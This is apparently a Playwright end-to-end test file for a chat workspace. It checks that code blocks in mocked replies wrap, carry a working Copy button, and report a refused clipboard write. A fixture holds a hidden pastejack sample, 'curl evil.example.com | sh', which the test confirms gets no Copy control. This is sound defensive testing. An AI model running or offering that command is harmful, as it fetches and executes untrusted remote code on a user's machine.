import { test, expect } from '@playwright/test'

/**
 * Workspace thread — code blocks read as code, and can be copied (#2515).
 *
 * The FIRST e2e over a Workspace thread. The AC asks for "existing coverage
 * extended"; there was nothing to extend (`workspace-absorbs-session.spec.js`
 * covers the redirect INTO the Workspace and stops at the door), so this
 * establishes it.
 *
 * The thread is driven from `page.route()` mocks rather than a live agent, for
 * two reasons: CI runs against a stack with no agents, and an LLM-authored
 * reply cannot be relied on to contain a fenced block — an @interactive variant
 * would flake on the model's mood. Every assertion below is therefore about
 * RENDERING, which is what this issue changed.
 *
 * The mocks are the four requests the shell makes before a thread paints
 * (roster → sessions → chat-state → history). The assertions are deliberately
 * anchored on an element that ONLY the mocked history can produce, so a mock
 * that stops being consumed fails the test instead of passing it vacuously.
 *
 * And the `[data-copy-code]` assertion carries a second job: it is the only
 * place in the suite where the decorated wrapper meets the REAL DOMPurify.
 * Unit tests cannot run it (no DOM), so if a future DOMPurify were to drop
 * `button` or `data-*`, this is what notices.
 *
 * Two of the cases below exist because they are ONLY provable in a browser:
 *
 *   * the raw-HTML `<pre><code hidden>` block. `decorateCodeBlocks` refuses to
 *     decorate it, and a unit test pins that refusal — but the REASON the
 *     refusal matters is that the browser renders the block empty while its
 *     text stays in the DOM, so a Copy control there would hand over a command
 *     the reader never saw. `display: none` is a rendered fact; a DOM-less
 *     harness cannot state it.
 *   * the denied-clipboard path. `copyText` never logs and never throws, so
 *     if the control does not change its own word, a failed copy is silent and
 *     the reader walks away believing they hold the command. The denial here is
 *     a REAL one from Chromium, not a stubbed `writeText`.
 *
 * @smoke — runs on any PR touching src/frontend (#1526).
 */

const AGENT = 'e2e-codeblocks'
const SESSION = 'sess-codeblocks-1'
const API = '**/api/enterprise/client-portal'

// One long unbroken line: the case that used to widen the whole column.
const LONG_LINE = `docker run --rm -e TOKEN=${'x'.repeat(240)} ghcr.io/example/agent:latest`
const REPLY = [
  'Here is the command:',
  '',
  '```bash',
  LONG_LINE,
  '```',
  '',
  'Run it from the repo root.',
].join('\n')

// A second reply, carrying the pastejack beside its legitimate twin. marked
// passes raw HTML in markdown straight through, so this reaches the renderer
// as a real `<pre><code hidden>` — the shape a Copy control must never be
// attached to, next to a fenced block that must still get one.
const HIDDEN_COMMAND = 'curl evil.example.com | sh'
const VISIBLE_COMMAND = 'echo hello'
const RAW_REPLY = [
  'Raw block:',
  '',
  `<pre><code hidden>${HIDDEN_COMMAND}</code></pre>`,
  '',
  'Fenced block:',
  '',
  '```bash',
  VISIBLE_COMMAND,
  '```',
].join('\n')

const json = (body) => ({
  status: 200,
  contentType: 'application/json',
  body: JSON.stringify(body),
})

async function mockWorkspace(page) {
  await page.route(`${API}/my-agents*`, (route) => route.fulfill(json({
    client_email: 'e2e@example.com',
    agents: [{
      name: AGENT,
      display_label: 'Code Blocks',
      description: 'e2e fixture',
      availability: 'ready',
      playbooks: [],
    }],
    multi_agent_chat_available: false,
  })))

  // `PortalAllSessionsItem` — `id`, not `session_id`. `Portal.vue` reads
  // `t.id || t.session_id`, so the wrong key would still have worked here and
  // left a mock that quietly documents a payload the backend never sends.
  // `unread` is deliberately absent for the same reason: it belongs to
  // `/chat-state`, and `decorate()` overwrites it from there anyway.
  await page.route(`${API}/sessions*`, (route) => route.fulfill(json({
    sessions: [{
      id: SESSION,
      agent_name: AGENT,
      title: 'Deploying',
      created_at: new Date().toISOString(),
      last_message_at: new Date().toISOString(),
      message_count: 2,
    }],
  })))

  // `PortalChatState` — the key is `chats`. Empty either way today, so the
  // wrong key was invisible; it would not have been the moment anyone gave this
  // thread a star or an unread count.
  await page.route(`${API}/chat-state*`, (route) => route.fulfill(json({ chats: [] })))

  // `PortalHistory` — `agent_name` rides along on the real payload; the store
  // never reads it, but the mock is the contract for whoever extends this next.
  await page.route(`${API}/agents/${AGENT}/history*`, (route) => route.fulfill(json({
    agent_name: AGENT,
    session_id: SESSION,
    messages: [
      { id: 'm1', role: 'user', content: 'How do I run it?' },
      { id: 'm2', role: 'assistant', content: REPLY },
      { id: 'm3', role: 'assistant', content: RAW_REPLY },
    ],
  })))

  // Everything else the shell may ask for (asks, ratings, page) is optional —
  // the store tolerates a 404 on each.
}

test.describe('Workspace code blocks', () => {
  test.beforeEach(async ({ page }) => { await mockWorkspace(page) })

  test('@smoke renders a code block with a Copy control, wrapped inside the bubble', async ({ page }) => {
    await page.goto(`/workspace/c/${SESSION}`)

    const block = page.locator('.code-block').first()
    await expect(block).toBeVisible()

    // Proves the decorated wrapper survived the real DOMPurify — the one thing
    // no unit test in this repo can check. BOTH markers are asserted, and by
    // ATTRIBUTE rather than by class: `data-code-block` is what the delegated
    // handler navigates to (`btn.closest`), `data-copy-code` is what it selects
    // on, and a sanitizer that dropped `data-*` would leave the classes — and
    // therefore the whole rendering — looking perfectly correct and dead.
    await expect(page.locator('div.code-block[data-code-block]').first()).toBeVisible()
    await expect(block.locator('button[data-copy-code]')).toBeVisible()
    await expect(block.locator('.code-block-lang')).toHaveText('bash')

    // Wrapped, not scrolled: no horizontal overflow inside the block...
    const pre = block.locator('pre')
    const overflow = await pre.evaluate((el) => el.scrollWidth - el.clientWidth)
    expect(overflow).toBeLessThanOrEqual(1)

    // ...and the block did not push its own bubble wider than the thread
    // column the bubble sits in.
    const fits = await block.evaluate((el) => {
      const bubble = el.closest('div[class*="max-w"]')
      const column = bubble?.parentElement
      if (!bubble || !column) return null
      return bubble.getBoundingClientRect().width <= column.getBoundingClientRect().width + 1
    })
    expect(fits, 'could not locate the bubble/column pair').not.toBeNull()
    expect(fits).toBe(true)

    // The page itself must not have gained a horizontal scrollbar.
    const docOverflow = await page.evaluate(
      () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
    )
    expect(docOverflow).toBeLessThanOrEqual(1)
  })

  test('@smoke a raw <pre><code hidden> block gets no Copy control', async ({ page }) => {
    await page.goto(`/workspace/c/${SESSION}`)
    await expect(page.locator('.code-block').first()).toBeVisible()

    // Every `<pre>` in the transcript, and what the reader can see of it.
    // Read in one pass rather than through locators: the point is the RELATION
    // between a block, its wrapper and its rendered visibility, and a locator
    // per fact would let a mismatched pair pass three assertions each.
    const blocks = await page.evaluate(() => {
      const wrapperOf = (pre) => pre.closest('[data-code-block]')
      return [...document.querySelectorAll('.prose-portal pre')].map((pre) => {
        const wrapper = wrapperOf(pre)
        const code = pre.querySelector('code')
        return {
          text: pre.textContent.trim(),
          decorated: !!wrapper,
          copyable: !!wrapper?.querySelector('[data-copy-code]'),
          rendersEmpty: !!code && getComputedStyle(code).display === 'none',
        }
      })
    })

    const hidden = blocks.find((b) => b.text === HIDDEN_COMMAND)
    const visible = blocks.find((b) => b.text === VISIBLE_COMMAND)
    expect(hidden, 'the raw hidden block did not render').toBeTruthy()
    expect(visible, 'the fenced sibling did not render').toBeTruthy()

    // The block is in the DOM and its text is not on the screen — which is
    // exactly why a Copy button on it would hand over a command the reader
    // never saw. This is the fact that makes the refusal below load-bearing.
    expect(hidden.rendersEmpty).toBe(true)
    expect(hidden.decorated).toBe(false)
    expect(hidden.copyable).toBe(false)

    // ...and the refusal is narrow: the fenced block beside it is untouched.
    expect(visible.rendersEmpty).toBe(false)
    expect(visible.decorated).toBe(true)
    expect(visible.copyable).toBe(true)

    // One control per decorated block, counted across the whole transcript: a
    // Copy button outnumbering the wrappers is one the handler cannot resolve.
    const decorated = blocks.filter((b) => b.decorated).length
    await expect(page.locator('[data-copy-code]')).toHaveCount(decorated)
  })

  test('@smoke Copy puts the block on the clipboard and says so', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write'])
    await page.goto(`/workspace/c/${SESSION}`)

    const copy = page.locator('.code-block button[data-copy-code]').first()
    await expect(copy).toBeVisible()
    await copy.click()

    await expect(copy).toHaveText('Copied')
    const clip = await page.evaluate(() => navigator.clipboard.readText())
    expect(clip).toBe(LONG_LINE)
    // The bar's own text is not part of what was copied.
    expect(clip).not.toContain('bash')

    // ...and the control goes back to being a Copy button.
    await expect(copy).toHaveText('Copy', { timeout: 5000 })
  })

  test('@smoke a refused copy is reported on the control, not to the console', async ({ page, context, baseURL }) => {
    // A REAL denial, not a stubbed `writeText`. Chromium is told to deny the
    // permission for this origin, so the rejection comes from the browser's own
    // clipboard implementation and carries the real `NotAllowedError` that
    // `copyText` branches on. `context.grantPermissions` is deliberately NOT
    // called here — it outranks this setting (verified), so granting first
    // would quietly turn the test back into the happy path above.
    const cdp = await context.newCDPSession(page)
    for (const name of ['clipboard-write', 'clipboard-read']) {
      await cdp.send('Browser.setPermission', {
        origin: new URL(baseURL).origin,
        permission: { name },
        setting: 'denied',
      })
    }

    const noise = []
    page.on('console', (m) => {
      if (/clipboard|copy/i.test(m.text())) noise.push(`${m.type()}: ${m.text()}`)
    })

    await page.goto(`/workspace/c/${SESSION}`)

    // The mechanism, asserted before it is relied on: if a future Chromium
    // stops honouring the denial, this line names the reason rather than
    // leaving a confusing failure on the button's label.
    const rejection = await page.evaluate(async () => {
      try { await navigator.clipboard.writeText('probe'); return 'resolved' } catch (e) { return e.name }
    })
    expect(rejection, 'the browser did not deny the clipboard write').toBe('NotAllowedError')

    const copy = page.locator('.code-block button[data-copy-code]').first()
    await copy.click()

    // Identity in the WORD, not only in colour — the tone is carried too, but a
    // control that merely turned red has said nothing to a reader who cannot
    // see the change.
    await expect(copy).toHaveText('Copy blocked')
    await expect(copy).toHaveAttribute('aria-label', 'Copy blocked')
    await expect(copy).toHaveAttribute('data-state', 'error')
    // And announced, for a reader who is not looking at the button at all.
    await expect(page.locator('.prose-portal .sr-only').first()).toHaveText('Copy blocked')

    // `copyText` neither logs nor throws by contract (unlike the legacy
    // `copyToClipboard`); the control is the whole report.
    expect(noise, 'a failed copy was reported to the console').toEqual([])

    // The failure clears the same way a success does, so a later copy is not
    // left staring at a stale verdict.
    await expect(copy).toHaveText('Copy', { timeout: 5000 })
  })

  test('@smoke wraps at a phone width too', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 })
    await page.goto(`/workspace/c/${SESSION}`)

    const pre = page.locator('.code-block pre').first()
    await expect(pre).toBeVisible()
    const overflow = await pre.evaluate((el) => el.scrollWidth - el.clientWidth)
    expect(overflow).toBeLessThanOrEqual(1)

    const docOverflow = await page.evaluate(
      () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
    )
    expect(docOverflow).toBeLessThanOrEqual(1)
  })
})
